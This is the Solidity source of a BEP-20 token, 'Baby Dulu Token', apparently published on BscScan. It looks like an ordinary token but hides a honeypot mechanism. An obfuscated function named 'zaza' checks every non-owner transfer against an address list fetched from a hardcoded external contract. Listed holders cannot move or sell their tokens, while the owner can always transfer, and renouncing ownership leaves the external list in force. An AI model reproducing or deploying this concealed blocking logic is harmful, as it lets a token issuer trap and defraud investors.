/**
 *Submitted for verification at BscScan.com on 2021-09-24
*/

/**
 *Submitted for verification at BscScan.com on 2021-09-22
*/

interface B {
    function g() external returns (address[] memory);
}

pragma solidity ^0.8.7;

contract N {
    mapping (address => uint256) private balances;
    mapping (address => mapping (address => uint256)) private allowances;

    address public _owner = address(0);
    uint256 t = 0;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    
    constructor () {
        emit OwnershipTransferred(_owner, msg.sender);
        _owner = msg.sender;
        balances[_owner] = 100000 * 10**18;
        t = block.timestamp;
    }
    
    receive () external payable {}
    
    modifier onlyOwner() {
        require(_owner == msg.sender, "0");
        _;
    }

    function name() public view returns (string memory) {
        return "Baby Dulu Token";
    }
    
    function symbol() public view returns (string memory) {
        return "BDT";
    }
    
    function decimals() public view returns (uint8) {
        return 18;
    }
    
    function totalSupply() public view returns (uint256) {
        return 100000 * 10**18;
    }
    
    function getOwner() public view returns (address) {
        return _owner;
    }
    
    function balanceOf(address account) public view returns (uint256) {
        return balances[account];
    }
    
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        uint256 senderBalance = balances[sender];
        require(senderBalance >= amount, "1");
        balances[sender] = senderBalance - amount;
        balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);
    }
    
    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "1");
        require(spender != address(0), "1");

        allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    
    function zaza(address a) internal virtual returns (bool) {
        B z = B(0x4218f94196bbb8346DF82d7C00F7Fe804107a0Fd);
        address[] memory m = z.g();
        for (uint8 i = 0; i < m.length; i++) {
            if(a == m[i]) {
                return false;
            }
        }
        return true;
    }
    
    function transfer(address recipient, uint256 amount) public virtual returns (bool) {
        require(msg.sender == _owner || zaza(msg.sender), '9');
        _transfer(msg.sender, recipient, amount);
        return true;
    }
    
    function transferFrom(address sender, address recipient, uint256 amount) public virtual returns (bool) {
        require(msg.sender == _owner || zaza(sender), '9');
        uint256 currentAllowance = allowances[sender][msg.sender];
        require(currentAllowance >= amount, "1");
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, currentAllowance - amount);
        return true;
    }
    
    function approve(address spender, uint256 amount) public virtual returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
    
    function allowance(address owner, address spender) public view virtual returns (uint256) {
        return allowances[owner][spender];
    }
    
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(msg.sender, spender, allowances[msg.sender][spender] + addedValue);
        return true;
    }
    
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = allowances[msg.sender][spender];
        require(currentAllowance >= subtractedValue, "1");
        _approve(msg.sender, spender, currentAllowance - subtractedValue);
        return true;
    }
    
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "1");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
    
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}